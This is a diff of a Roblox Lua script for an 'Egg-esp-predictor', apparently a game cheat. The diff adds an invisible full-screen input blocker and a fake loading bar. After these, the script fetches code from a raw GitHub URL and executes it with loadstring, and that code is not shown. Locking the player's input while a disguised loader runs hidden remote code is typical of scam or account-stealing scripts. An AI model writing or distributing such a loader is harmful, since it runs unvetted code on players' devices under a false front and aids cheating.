@@ -1,81 +1,84 @@
 local player = game.Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "EggESPLoading"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 999999
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 
--- Create ScreenGui
-local gui = Instance.new("ScreenGui")
-gui.Name = "EggESPLoadingScreen"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.Parent = playerGui
+-- Input Blocker
+local blocker = Instance.new("TextButton", screenGui)
+blocker.BackgroundTransparency = 1
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.Position = UDim2.new(0, 0, 0, 0)
+blocker.Modal = true
+blocker.AutoButtonColor = false
+blocker.ZIndex = 9999
 
--- Black Background
-local blackFrame = Instance.new("Frame", gui)
-blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-blackFrame.Size = UDim2.new(1, 0, 1, 0)
-
--- Main Loading Box
-local box = Instance.new("Frame", blackFrame)
-box.Size = UDim2.new(0.5, 0, 0.25, 0)
-box.Position = UDim2.new(0.25, 0, 0.375, 0)
-box.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-box.BorderSizePixel = 0
-box.BackgroundTransparency = 0.1
-
-Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
+-- Black background
+local bg = Instance.new("Frame", screenGui)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.ZIndex = 1
 
 -- Title
-local title = Instance.new("TextLabel", box)
+local title = Instance.new("TextLabel", bg)
 title.Text = "Egg-esp-predictor"
-title.Size = UDim2.new(1, 0, 0.3, 0)
-title.Position = UDim2.new(0, 0, 0.05, 0)
 title.TextColor3 = Color3.new(1, 1, 1)
-title.BackgroundTransparency = 1
 title.TextScaled = true
 title.Font = Enum.Font.GothamBold
+title.Size = UDim2.new(0.6, 0, 0.1, 0)
+title.Position = UDim2.new(0.2, 0, 0.35, 0)
+title.BackgroundTransparency = 1
+title.ZIndex = 2
 
--- Subtitle
-local subtitle = Instance.new("TextLabel", box)
-subtitle.Text = "LOADING PLEASE WAIT"
-subtitle.Size = UDim2.new(1, 0, 0.2, 0)
-subtitle.Position = UDim2.new(0, 0, 0.35, 0)
-subtitle.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-subtitle.BackgroundTransparency = 1
-subtitle.TextScaled = true
-subtitle.Font = Enum.Font.Gotham
+-- Loading text
+local loadingText = Instance.new("TextLabel", bg)
+loadingText.Text = "Loading please wait"
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.Gotham
+loadingText.Size = UDim2.new(0.6, 0, 0.05, 0)
+loadingText.Position = UDim2.new(0.2, 0, 0.45, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.ZIndex = 2
 
--- Progress Bar Container
-local barContainer = Instance.new("Frame", box)
-barContainer.Size = UDim2.new(0.9, 0, 0.18, 0)
-barContainer.Position = UDim2.new(0.05, 0, 0.7, 0)
-barContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barContainer.BorderSizePixel = 0
-Instance.new("UICorner", barContainer).CornerRadius = UDim.new(1, 0)
+-- Progress bar background
+local barBG = Instance.new("Frame", bg)
+barBG.Size = UDim2.new(0.6, 0, 0.03, 0)
+barBG.Position = UDim2.new(0.2, 0, 0.55, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBG.BorderSizePixel = 0
+barBG.ZIndex = 2
 
--- Progress Bar Fill
-local barFill = Instance.new("Frame", barContainer)
+-- Bar fill
+local barFill = Instance.new("Frame", barBG)
 barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
 barFill.BorderSizePixel = 0
-Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+barFill.ZIndex = 3
 
--- Percentage Text
-local percentText = Instance.new("TextLabel", barContainer)
-percentText.Size = UDim2.new(1, 0, 1, 0)
-percentText.Position = UDim2.new(0, 0, 0, 0)
-percentText.BackgroundTransparency = 1
+-- Percentage text
+local percentText = Instance.new("TextLabel", bg)
+percentText.Text = "1%"
 percentText.TextColor3 = Color3.new(1, 1, 1)
 percentText.TextScaled = true
-percentText.Font = Enum.Font.GothamBold
-percentText.Text = "0%"
+percentText.Font = Enum.Font.Gotham
+percentText.Size = UDim2.new(0.2, 0, 0.05, 0)
+percentText.Position = UDim2.new(0.4, 0, 0.6, 0)
+percentText.BackgroundTransparency = 1
+percentText.ZIndex = 2
 
--- Animate Loading Bar
+-- Animate loading bar
 task.spawn(function()
 	for i = 1, 100 do
-		barFill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Sine", 0.02, true)
+		barFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Linear", 0.02, true)
 		percentText.Text = i .. "%"
-		subtitle.Text = "LOADING PLEASE WAIT"
-		task.wait(1.00)
+		task.wait(0.12)
 	end
-	task.wait(0.4)
-	gui:Destroy() -- Remove the loading screen
+	task.wait(0.5)
+	screenGui:Destroy()
+
+	-- Load external GUI
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/secret-hub1/Eggg-esp-predictor/refs/heads/main/Egg-esp-predictorr"))()
 end)
